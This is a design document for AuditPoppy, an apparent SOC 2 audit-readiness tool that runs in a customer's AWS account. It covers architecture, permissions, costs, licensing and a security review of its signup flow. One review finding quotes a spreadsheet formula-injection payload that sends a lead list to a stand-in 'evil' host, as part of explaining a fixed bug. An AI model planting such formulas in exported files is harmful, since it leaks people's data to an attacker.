# DESIGN.md — AuditPoppy

Source of truth for **AuditPoppy**: SOC 2 audit-readiness for the customer's **own AWS
account, from inside their own AWS account**. An AgentsPoppy extension ("poppy") built to the
framework (`~/Projects/agentspoppy/AGENTS.md` + `docs/INTEGRATION.md`). This doc records
decisions and rationale; update it whenever a decision changes.

> **Boundary:** AuditPoppy is a standalone project. It runs *on* AgentsPoppy — it does
> not fork or clone it. It never touches the mailpoppy or other poppy repos.

> **Sibling, not overlap:** the platform's per-poppy **compliance dossier**
> (`agentspoppy/docs/specs/compliance-dossier.md`, live 2026-09-01) documents the *poppies*
> a customer runs. AuditPoppy covers **the rest of their AWS estate** — the part their
> auditor actually spends the audit on. The two cross-sell each other.

---

## 0. The naming law (inherited, and it binds every word this poppy ships)

Nobody can sell a SOC 2 certificate — a SOC 2 report is signed only by a licensed CPA firm
after an audit, and Vanta cannot issue one either. AuditPoppy sells everything **before**
the auditor: continuous checks, evidence collection, gap analysis, policy documents, an
auditor-ready export. Approved vocabulary: **"audit-ready"**, **"evidence for your SOC 2
audit"**, **"mapped to the SOC 2 Trust Services Criteria"**. Forbidden, everywhere, including
marketing: "SOC 2 compliant", "SOC 2 certified", "get certified". Same register discipline as
the permission screen: enforced facts may say "enforced"; everything else says what it is.
The policy-document pack additionally carries "guidance, not legal advice" (the MailPoppy
AdminPrivacyNotice precedent).

## 0a. The cloud-neutral rule (founder, 2026-09-03)

**User-facing copy says "cloud", never "AWS".** v1 checks AWS accounts, and more clouds
follow — copy written as AWS-only would have to be rewritten everywhere at that moment,
and reads today as a narrower product than it is meant to be. So: *your cloud account*,
*the cloud estate*, *your cloud provider's price list*.

**Proper nouns are exempt and must stay.** "AWS Config" and "AWS Security Hub" are the
names a user looks for in their own console, and "CIS AWS Foundations Benchmark v1.2.0"
is the standard's actual title; renaming those would make the product unusable, not
neutral. The same holds for the remediation text in the mapping table (§5), which names
real AWS things a user must go and change — when a second cloud lands it gets its own
mapping table, not a laundered version of this one.

Enforced like the other two laws: `CLOUD_NEUTRAL` in `packages/core/src/naming.ts`, and
the repo-wide scan in `naming.test.ts`, which strips comments first — the laws bind what
a user reads, not what developers write to each other.

## 1. What it is — and the wedge against Vanta

Vanta/Drata/Secureframe sell audit-readiness at **$10k–30k+/year**, and their architecture has
an irony at its core: **to prove you're secure, you grant a third-party SaaS read access to
your entire cloud.** That is exactly the trade AgentsPoppy exists to kill.

AuditPoppy does the AWS half of that job **inside the customer's own account**:

1. **No vendor in the evidence path.** Findings, evidence snapshots and reports live in the
   customer's own S3/DynamoDB. Olly Digital never sees a security posture, a resource name,
   or a finding. The pitch in one line: *compliance evidence that never leaves your cloud.*
2. **AWS does the heavy lifting — Config + Security Hub.** AWS ships the check engines
   Vanta resells a view of: **AWS Config** (resource recording + managed rules) and
   **Security Hub** (CIS / AWS Foundational Security Best Practices checks). AuditPoppy
   turns them on, translates their output into auditor language, and packages the result —
   mostly orchestration + rendering, the same shape as MailPoppy's GuardDuty integration,
   scaled up. ⚠️ **AWS Audit Manager is OUT** — phase 0 (2026-09-02) found it in
   **maintenance mode since 2026-04-30**: it cannot be enabled for new accounts, which is
   every AuditPoppy customer by definition. Evidence collection is therefore the poppy's
   own (§2.2), and the SOC 2 mapping is fully repo-owned (§5) — which also means the
   product is not hostage to a deprecated AWS service, and the per-assessment Audit
   Manager cost disappears.
3. **A fraction of the price.** The AWS services bill single-digit to low-tens of $/month in
   the customer's own account (printed before consent — §7); the poppy's subscription is
   ~95% below the incumbents (§8). Price is credibility in this market: it is priced as a
   compliance product, not a $14.99 utility.
4. **Honest about scope.** SOC 2 covers the whole company — laptops, HR on/offboarding,
   vendors, written policies. AuditPoppy covers **the AWS estate + the written policies +
   the evidence workflow**, and says so plainly. v1 does not pretend to be a GRC suite
   (non-goals in §9). For many small SaaS companies the AWS estate *is* most of the technical
   audit; the rest is process the policy pack templates.

**Who buys it:** the AWS-native SaaS company (1–50 people) whose first enterprise customer
just asked for SOC 2; the fractional CISO/consultant running readiness for several clients
(each client installs in their own account — the agency pattern); the AgentsPoppy enterprise
prospect who needs "can we let agents touch our cloud?" answered *and* their own estate
checked by the same platform.

## 2. What v1 does (four deliverables)

1. **Readiness scan + gap report.** On demand: read the estate (read-only), run/ingest the
   Security Hub CIS + FSBP checks and Config rules, and render a gap report **grouped by SOC 2
   Trust Services Criteria** (CC6 access, CC7 operations, CC8 change management, …): each
   failing control with the affected resources, why an auditor cares, and the concrete AWS
   fix. This is the demo, the free tier, and the hook.
2. **Continuous evidence collection — the poppy's own (Audit Manager is unavailable to
   new accounts, §1.2).** Keep Config/Security Hub running; the **snapshot Lambda** (monthly,
   configurable) is THE evidence collector: it writes a dated, immutable evidence bundle
   (posture summary, per-control status, raw finding exports, Config state) to the customer's
   own **versioned S3 evidence bucket** — the "operating effectively over the audit period"
   record auditors actually need. Optional S3 Object Lock for tamper-evidence.
3. **The policy pack.** Generated written policies auditors require (access control, change
   management, incident response, vendor management, data retention…), pre-filled from what
   the poppy can observe (e.g. the real IAM/MFA posture), editable, exported as documents.
   Framed as templates + guidance, not legal advice.
4. **The auditor export.** One button: a dated package (PDF + JSON) — gap status, evidence
   index, policy set, CUEC-style notes — that the customer hands to their CPA firm. Follows
   the dossier's register discipline: platform-observed facts vs. customer-entered statements
   are typographically distinct.

## 3. Architecture (thin by design — one small stack)

```
AgentsPoppy poppy UI (screens: Readiness · Evidence · Policies · Export · Costs)
        │ backend routes (scoped, short-lived creds via the broker)
        ▼
  sidecar backend ──► enable/configure: Config recorder · Security Hub (CIS+FSBP)
        │                                                        (ledger-recorded)
        │            read: findings, control status, resource inventory   (read-only)
        ▼
  CloudFormation stack `AuditPoppyStack` (the ONLY deployed compute):
     S3 evidence bucket  (versioned; optional Object Lock; auditpoppy-*)
     snapshot Lambda     (monthly EventBridge rule → posture+findings bundle → S3)
     DynamoDB `assessments` (scan history, policy-doc state, settings)
```

- **The poppy's own cloud code is one Lambda that talks only to AWS** → `network.egress:
  "aws-only"`, `infrastructure: "none"` (it creates nothing internet-facing).
- **`network.machine`: a real, enforceable list.** The desktop half talks to AWS and the
  platform — nothing else, no user-typed hosts. AuditPoppy should declare
  `machine: "aws-only"` (backend; the tab's platform call is exempt by contract) and become
  **the first poppy wearing the Host-enforced chip** — a compliance product whose own network
  behaviour is host-refused-beyond-declaration is the best possible proof-of-concept, and the
  dossier/marketing may say so. (Verify against the gate's AWS-matching before release.)
- **Reports render in the poppy UI**; PDFs are generated client-side or by the sidecar —
  never by a cloud service.

### Teardown / leaves-no-trace nuance (design it in from day 1)

Config and Security Hub are **account-level services**, not stack resources.
Rules: (a) record every enablement in the transparency ledger with a **pre-existing check** —
if the service was already on, the poppy records "found enabled, not ours" and teardown never
touches it; (b) teardown offers to disable exactly what the poppy enabled (default on),
deletes the stack, and empties/deletes the evidence bucket **only after an explicit
type-to-confirm** — evidence is the one thing a user may want to outlive the poppy, so the
export flow is offered first. The certification harness must pass with these semantics.

## 4. Permissions — the first deliberately WIDE poppy, and how it stays honest

AuditPoppy needs to *see everything* (that is the product) and *change almost nothing*:

- **Wide READ, explicitly enumerated** — Describe/List/Get across the audited services (IAM,
  S3, EC2, RDS, Lambda, CloudTrail, KMS, …) plus `securityhub:Get/Describe*`,
  `config:Get/Describe/Select*`. No `iam:*` writes, no data-plane
  reads (it reads *about* buckets, never *from* them — no `s3:GetObject` outside its own
  evidence bucket). This distinction goes in the grant `reason` fields and the dossier.
- **Narrow WRITE**: its stack (`AuditPoppyStack*`), its bucket (`auditpoppy-*`),
  its table, and the service-enablement actions (`config:Put*`, `securityhub:Enable*`/
  `BatchEnableStandards`), all attribution-tagged where AWS allows. Phase 0 note: enabling
  Config needs `iam:CreateServiceLinkedRole` (config.amazonaws.com) + `iam:PassRole` on the
  SLR — which validated immediately in phase 0 (an earlier "SLR lag" reading was a
  malformed-ARN bug on our side, phase0-derisk.md finding 2). Build requests as typed SDK
  objects, never interpolated strings.
- The permission screen already presents this honestly ("N of M confined; the wide ones are
  read-only") and the risk rating will be what it is — the listing copy explains *why* wide
  read is the product, in the approval-preview `reason`s, not by fighting the rating.
- Validate both halves with `accessanalyzer validate-policy` + the service-reference scoping
  check (the [[aws-service-reference-scoping]] lesson) before any live run.

## 5. Frameworks & mapping

- **v1:** SOC 2 Trust Services Criteria (the market's ask) with the technical checks sourced
  from Security Hub's **CIS AWS Foundations** + **AWS FSBP** standards. The TSC↔check
  mapping table is **fully repo-owned**, versioned content — reviewed, test-pinned, and the
  single place a control's "why an auditor cares" prose lives. (It was going to lean on
  Audit Manager's prebuilt SOC 2 framework; phase 0 found that service closed to new
  accounts, so the mapping is ours outright — more work once, no deprecation hostage.)
- **Later:** ISO 27001 and PCI views are mostly re-mapping the same checks; multi-framework
  is a rendering feature, not new collection.

## 6. Privacy & threat model (the honest paragraph, up front)

Everything stays in the customer's account — but the *customer's own admins* can read the
evidence bucket, and the poppy's findings describe security weaknesses. So: the evidence
bucket is SSE + TLS-only + no public access (MailPoppy's §14 hardening list, reused); the
gap report's export warns it is sensitive; and the poppy's own compliance block declares
`subprocessors: []` — no user data, findings included, ever reaches the developer. The
in-app screens state the same in plain words.

## 7. Costs (GuardDuty precedent — recommended, opt-in, priced before consent)

The poppy's deploy screen itemizes the AWS services it would enable, each with its own
toggle, its pricing model, and a **monthly estimate computed from the account's actual
resource count** before anything is enabled (approximate figures below are from AWS public
pricing as of design time — re-verify at implementation and print live numbers in-app):

| Service | Pricing shape (verify at build) | Small-account magnitude |
|---|---|---|
| AWS Config | per configuration item recorded + per rule evaluation | $3–15/mo |
| Security Hub | per security check + per finding ingested (30-day free trial) | $1–10/mo |
| Evidence bucket + Lambda | S3 + one invocation/month | cents |

Rule inherited from AGENTS.md §9 ("show the money"): no service is enabled silently, the
estimate is shown next to the toggle, and the Costs screen shows the actuals afterwards.

**The free-trial rule (from the founder's own reaction to phase 0, 2026-09-02):** where a
service has a free trial (Security Hub's 30 days), the toggle and the Costs screen must say
**"free trial ends on [date] — expected cost after that: $X/month while enabled"**, and the
Costs screen shows the disable switch right next to that line. A user must never discover a
trial converted to charges; "free trial" without the end date and the off switch is how
silent subscriptions happen, and this product exists to remove exactly that kind of doubt.

## 8. Licensing & pricing model — DECIDED (founder, 2026-09-02): personal-free, business-paid

**No feature-gated freemium split.** The whole product is free — every feature, no tier
gating in code — **for personal use, evaluation and testing**. A paid license is required
for **business use**: the moment a company uses the outputs externally (hands an export to
its auditor, answers a customer's vendor-risk request with it). The founder's enforcement
logic, verbatim: *"enterprise won't risk to have unlicensed software running in their
environment"* — the Docker-Desktop model, social/legal enforcement, not DRM.

**The watermark is the mechanism that makes it self-enforcing.** In the unlicensed version,
every page of every generated document — the auditor export, the policy pack, the gap-report
PDF — carries a watermark (founder's wording as the base: *"made with Olly Digital — for
personal use"*; final form, DECIDED 2026-09-03: **"AuditPoppy by Olly Digital — not licensed
for business use"**). It dropped "for personal use only" when the ladder was rewritten: the free
row is where a 500-person company's evaluation starts, not a personal tier, and a watermark that
calls its own reader a hobbyist repeats the exact mistake the tier names were renamed to avoid.
The remaining clause is the whole message anyway.
This is unusually strong in THIS product: the export's entire purpose is to be handed to an
external party, and a "not licensed for business use" mark inside a company's *compliance
evidence* is disqualifying to exactly the reader it reaches. The gate sits precisely on the
"producing it externally" line, while evaluation stays fully functional and pleasant — the
in-app screens are never watermarked, only the exported documents. The watermark is also an
ad (the Canva effect): every unlicensed export markets the product to an auditor.

**The small-company tier (founder, 2026-09-02):** companies **under 10 employees get the
business license free — but they must register on the AgentsPoppy website and say who they
are**, and the license is granted to that identity. The founder's rationale, verbatim: *"so
at least we know who is using it."* This is the JetBrains-startup / Docker-under-250 pattern,
and it makes the free tier the lead pipeline: small companies grow into paying customers,
and we know them by name from day one. Mechanics: **the contact email is verified before
anything happens** (founder, 2026-09-03) — the request reaches neither the review queue nor the
mailing list until a one-time link is clicked, so nobody can enlist a stranger's address or claim
a licence for a company whose contact email they merely guessed; then self-declared headcount
attestation at registration (honor system, like Docker's employee line — the license terms make a false
attestation a license violation, no verification bureaucracy); grant is **manual at first**
(founder approves from the admin panel — the MailPoppy domain-comp precedent), automatable
later; **recommended: the grant renews annually** with a re-attestation, so the "under 10"
claim stays current as companies grow.

So the ladder, complete — and the watermark removal is the carrot at each step:

| Tier | Cost | Registration | Exports |
|---|---|---|---|
| **Everyone** — full access, any company size | free | none | watermarked |
| Individuals & companies up to 10 people | free | **sign up — identity known, license granted** | clean |
| Companies of more than 10 people | paid (§11.2) | account (checkout) | clean |

**Where a granted licence LIVES (founder question, 2026-09-03): the cloud account, not the
install.** The obvious key is the platform's per-install `buyerId` — and it is wrong: it lives in
the host's local storage, so reinstalling AgentsPoppy or AuditPoppy mints a new one and a licence
someone was GIVEN would silently lapse, watermark back, no explanation. The grant is therefore
written against the platform's existing cross-install key (`target`), set to the cloud account id:
stable, on screen in the poppy's own header, and the unit the paid tier is priced per anyway. The
poppy clears the watermark on either the host's own check (a purchase from this install) or the
account's standing, read from the tab — where calling the platform API is exempt from the enforced
machine gate by contract. A *different* cloud account is a new licence unit, exactly as it would be
for a subscription. Built in `agentspoppy-web`: the signup, the admin queue, and the lead channel.

**Leaving the list is part of the deal, and it is built (2026-09-03).** Signup asks for marketing
consent, so the consent is only honest if the exit exists before the first mail goes out. Every
lead carries its own unsubscribe secret, minted once and never rotated — a re-submit keeps the old
one, so an opt-out link sitting in a mailbox from months ago still works. `POST
/api/leads/unsubscribe` is the only thing that can remove an address: **never a GET**, because mail
scanners, link previewers and corporate security gateways fetch every URL in an email and a
mutating GET would unsubscribe people who never clicked. The link in a mail therefore lands on
`/unsubscribe`, which asks; only the button posts. It answers identically for "no such address" and
"wrong token", so it cannot be used to test who is on the list; a second click is a success, not an
error. The CSV export carries the per-address link as a column — a list exported without it is a
list nobody may lawfully mail — and the licence-decision email carries it in the footer, that being
the one message every signup is guaranteed to receive. An unsubscribe removes the address from the
mailing list and touches nothing else: the licence on the cloud account stands.

**Security review of the licence flow (2026-09-03) — five findings, all fixed.** The signup
endpoint is public, unauthenticated and CORS-open, and what it stores is what an approval turns
into an entitlement, so it was reviewed as an attack surface rather than as a form.

1. **Any product could be requested.** `poppyId`/`productId` were free text, so a stranger could
   queue a request naming *another poppy's paid product* and rely on it reading as an ordinary
   small company in the review queue — the only thing marking it wrong was a product id in 12px
   grey. Now an allowlist (`GRANTABLE_PRODUCTS`), enforced at submit **and** re-checked at the
   grant, because that is the line where a record becomes an entitlement.
2. **The lead CSV was a formula-injection channel.** Company name is typed by a stranger and the
   export is opened in a spreadsheet, where a cell beginning `=`, `+`, `-` or `@` is executed —
   `=HYPERLINK("http://evil/"&A1,…)` exfiltrates the list to whoever submitted it. Cells are
   neutralised before quoting.
3. **Nothing throttled an endpoint that emails a caller-chosen address.** That is a spam cannon
   aimed at strangers and at our own sending reputation. Three confirmation emails per address
   and per cloud account per hour, counted in Firestore against a hashed key — these rows record
   attempts by addresses that never confirmed, which are exactly the ones we promise not to keep.
4. **"Consume the token" did not consume anything.** The db runs with
   `ignoreUndefinedProperties`, so setting `verifyTokenHash: undefined` under `{merge:true}`
   dropped the field *from the write* instead of removing it from the document — the code did not
   do what its comment said, and a superseded decline also left its `decidedAt`/`note` attached to
   whatever request replaced it, possibly a different applicant's. Licence-request writes are now
   a full replace.
5. **A declined request locked an account id forever.** Account ids are guessable, so one junk
   request declined would stop the real owner from ever registering. A decline now blocks only a
   re-submit from the *same* address; a different one may apply, and the queue shows
   `priorDeclinedAt` so the founder sees the history rather than losing it.

Accepted, not fixed: `/api/entitlement?target=` tells anyone holding a cloud account id whether
that account is licensed. It is the pre-existing cross-install gate MailPoppy's domain unlock also
uses, it returns one boolean and no account or payment detail, and the alternative is signing a
lookup the poppy must make before it has anything to sign with.

**The first row is the enterprise's evaluation path, and it must be NAMED that way
(founder review, 2026-09-03).** The ladder was first written with "Personal use /
evaluation" on top; a prospect of 200 people reading that concludes either "this is not
for us" or "we are already in breach", and never reaches the value. There is no size
limit on the free row — full access to every feature, at any size, with no time limit —
so the row is named for what someone is DOING, not for how big they are, and the whole
model is stated in one sentence above the table: *full access for everyone, free;
exported documents carry a watermark until you take it off — by signing up (up to 10
people) or subscribing (more than 10)*. Pinned in `packages/core/src/licensing.test.ts`.

Rules: the license terms state all three lines in plain words in the listing and in-app; the
paid entitlement (AgentsPoppy first-party checkout, `kind=subscription`, per AWS account) and
the granted small-company entitlement both remove the watermark; **no other behavioural
difference** — every install is otherwise identical, which keeps the build simple and the
evaluation honest. No technical anti-tamper: the code is source-available, a determined user
can strip a watermark, and the enforcement is the license terms plus the professional
context — build no DRM. Cancellation via the built-in billing portal like every first-party
product. Web-side work item: a small registration/request form + admin grant flow, reusing
the existing AgentsPoppy account and entitlement plumbing.

**Price — DECIDED (founder, 2026-09-02): $499/yr** per AWS account ("499 is fine"),
via the AgentsPoppy first-party checkout. Rationale kept for the record: compliance budgets
are the richest in software; at $499/yr it undercuts Vanta ~95% while still reading as a
serious product — $14.99 would cost credibility, not gain adoption.

**$499 is the launch value, not a constant (founder, 2026-09-02): the price is NEVER
hardcoded in the poppy.** It lives in the commerce database (the `products` collection,
edited from the /admin panel) — the platform's authoritative pricing source, which the
catalogue pages, the checkout and the listing already read live. The poppy UI shows the
price only by fetching it (the products API), and no dollar amount appears in the poppy's
code, manifest, listing copy or screenshots — a founder price change from /admin must be
complete by itself, with nothing in the shipped poppy to go stale.

## 9. Non-goals (v1) — say no in the design so the copy never overclaims

- **No laptops/MDM, no HR/IdP integrations, no vendor-management workflows** — the non-AWS
  half of Vanta. Named in the listing as out of scope.
- **No auditor marketplace** — we prepare the package; the customer picks their CPA firm.
- **No multi-account/Organizations roll-up in v1** (the fractional-CISO pattern works
  per-account already; Organizations is the obvious v2).
- **No auto-remediation.** The gap report tells the customer what to change; a poppy with
  wide write access to fix findings would destroy the wide-read-only trust story. Never.
- **No OpenSearch/always-on compute** — the cost model stays serverless, ~$0 between scans
  except what the AWS audit services themselves bill.

## 10. Risk register

| Risk | Mitigation |
|---|---|
| Overclaiming ("compliant") anywhere in copy | naming law §0; test-pinned strings like the dossier's |
| Wide-read optics ("it reads everything") | read-only enumerated grants + reasons; its own dossier; the Host-enforced machine chip (§3) |
| AWS cost surprise | per-service toggles, live estimates, Costs screen actuals |
| Security Hub regional gaps | region picker limited to supported regions (MailPoppy SES precedent) |
| Policy pack read as legal advice | "guidance, not legal advice" framing on every generated doc |
| Teardown deleting evidence a user needs | export-first flow + type-to-confirm + "found enabled, not ours" ledger semantics (§3) |
| Mapping drift as AWS renames checks | versioned mapping table + a sync test against the live standards list |
| Business use that never exports (free-riding on the personal tier) | the license line is USE-based ("business use requires a license"), not export-based — the watermark is the enforcement moment, not the definition; §8 |
| Headcount self-declared ("under 10") | attestation in the license terms (false = violation) + annual renewal/re-attestation + manual grant sees who is asking; §8 |

## 11. Open questions for the founder

1. **Name — DECIDED (founder, 2026-09-02): AuditPoppy.** "Soc2Poppy" was considered and
   rejected: SOC 2 is AICPA's mark, none of the incumbents put it in their product name
   (their neutral names + SOC-2-first taglines are that legal judgment congealed into a
   pattern), and a certificate-named product both boxes out ISO 27001/PCI views and reads
   as "SOC 2 in a box" to a skeptical buyer. The explicitness lives in the tagline instead:
   **"AuditPoppy — SOC 2 audit-readiness in your own AWS"** — which is also what search
   matches. Manifest id: `com.auditpoppy.desktop`.
2. **Pricing — DECIDED (founder, 2026-09-02): $499/yr** per AWS account, as the launch value in the commerce database — never hardcoded in the poppy (§8).
3. **Licensing model — DECIDED (founder, 2026-09-02): three tiers.** Personal/evaluation
   free with watermarked exports; **companies under 10 employees free with mandatory
   registration on the AgentsPoppy website** (identity known, license granted, clean
   exports); 10+ employees paid. No feature-gated freemium. Full rules in §8, including
   the recommended watermark wording ("…not licensed for business use"), the annual
   re-attestation recommendation, and the no-DRM rule.
4. **Policy pack in v1 — DECIDED (founder, 2026-09-02: "proceed" on the recommendation):
   INCLUDED.** It is half the perceived value against Vanta, and it is rendering work,
   not infrastructure.
5. **The Host-enforced machine declaration — DECIDED (founder, 2026-09-02: "proceed" on
   the recommendation): YES.** AuditPoppy declares `machine: "aws-only"` and is sequenced
   to be the first poppy wearing the Host-enforced chip (§3); verify the gate's
   AWS-matching against the poppy's real connections before release.

## 12. Phase plan

0. **De-risk (small, live) — RUNNING (2026-09-02, sandbox REDACTED-ACCOUNT-ID/eu-west-1; log:
   `phase0-derisk.md`).** Already caught the design-changing fact: **Audit Manager is in
   maintenance mode (closed to new accounts since 2026-04-30) → cut from the
   architecture**. Config + Security Hub enable/read paths verified live; costs measured
   over a week; teardown semantics verified at week's end (scheduled 09-09 + dead-man 09-20).
1. Readiness scan + gap report — **BUILT (2026-09-02)**.
2. The stack: evidence bucket + snapshot Lambda + continuous collection — **BUILT**.
3. Policy pack + auditor export — **BUILT**.
4. Checkout integration + listing — **in-app half BUILT** (Export tab: live-priced buy via
   the commerce bridge, small-company registration link, manage-billing; manifest carries
   `network` {aws-only, none, machine: aws-only} + the `compliance` block, and validates
   against the platform validator). **Listing/submission remains** (below).

### Build state (2026-09-02, first full build — all workspaces green)

Monorepo: `packages/core` (pure domain: the repo-owned TSC↔check mapping — 43 CIS 1.2.0 +
36 FSBP entries with auditor prose; gap report with the warming-up rule; enablement
ledger; costs + the free-trial rule; evidence bundles; licensing/watermark; policy pack;
a dependency-free PDF writer; both laws test-pinned across every shipped file),
`apps/desktop` (React on the poppy design kit; Readiness · Evidence · Policies · Export ·
Costs · Feedback-last; helper prompt generated from the live catalogues; type-to-confirm
disable switch on Costs), `apps/desktop/node-sidecar` (confined node22 bundle; baseline →
enable in the phase-0-proven order with a write-ahead ledger; readiness read path;
two-phase stack deploy, resumable from live state; `/teardown` honouring "found enabled,
not ours"), `lambdas` (the snapshot collector). 69 tests, typecheck clean,
`extension.json` GENERATED from `permissionSet()` (parity-tested) and green under the
platform's own `validate-manifest`.

**Small deviation from §3's sketch, recorded:** v0.1 keeps policy answers + auditor notes
in the sidecar's private dataDir (host-owned, confinement-safe); the DynamoDB
`assessments` table holds scan history. Moving answers/settings into the table (so they
survive a reinstall) is a listed follow-up, not a design change.

### What remains before listing

1. Phase-0 week-end: costs readout + teardown verification (scheduled 09-09/09-20) feed
   §7's printed magnitudes.
2. Live verify in the sandbox: install into AgentsPoppy, enable → report → stack →
   snapshot → export → teardown; confirm the `machine: "aws-only"` gate refuses nothing
   we need (§3) — then `npm run certify` for the leaves-no-trace certificate.
3. Platform-side work items: the `auditpoppy-business` product in the commerce db (price
   from /admin — never in the poppy), the small-company registration + grant flow (§8),
   the catalogue submission (RELEASING-POPPY.md).

All §11 questions are DECIDED — the design is complete. Phase 0 runs first (results land
in `phase0-derisk.md`, the MailPoppy pattern); the full build ran in its own session
against this document (2026-09-02).
